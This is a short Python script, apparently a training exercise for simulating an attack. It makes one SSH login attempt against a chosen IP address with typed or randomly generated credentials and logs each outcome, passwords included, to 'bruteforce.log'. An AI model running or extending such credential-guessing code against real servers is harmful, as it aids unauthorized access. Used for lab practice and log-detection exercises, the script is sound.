#!/usr/bin/env python3 

# Script Name:                          attack.py
# Author name:                          Tianna Farrow
# Date of latest revision:              02/08/2024
# Purpose:                              stimulating an attack on host ip
# Execution:                            python3 attack.py
# Additional Resources:                 https://docs.python.org/3/library/logging.html; https://docs.python.org/3/library/random.html; https://docs.python.org/3/howto/logging.html; https://docs.python.org/3/library/string.html; https://stackoverflow.com/questions/52057356/the-literal-format-of-format-asctimes-levelnames-messages; 
# Note

import paramiko
import random
import string
import logging

# logging 
logging.basicConfig(filename='bruteforce.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def generate_random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def attempt_login(ip_address, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip_address, username=username, password=password, timeout=5)
        client.close()
        return True
    except Exception as e:
        return False
    
def main():
    ip_address = input("Enter the IP address: ")
    username_input = input("Enter the username (leave blank for random): ")
    password_input = input("Enter the password (leave blank for random): ")

    if not username_input:
        username_input = generate_random_string(8)  # Generate a random username if no input provided
    if not password_input:
        password_input = generate_random_string(12)  # Generate a random password if no input provided

    if attempt_login(ip_address, username_input, password_input):
        logging.info(f"Successful login attempt: IP - {ip_address}, Username - {username_input}, Password - {password_input} ")
    else:
        logging.info(f"Failed login attempt: IP - {ip_address}, Username - {username_input}, Password - {password_input}")

if __name__ == "__main__":
    main()
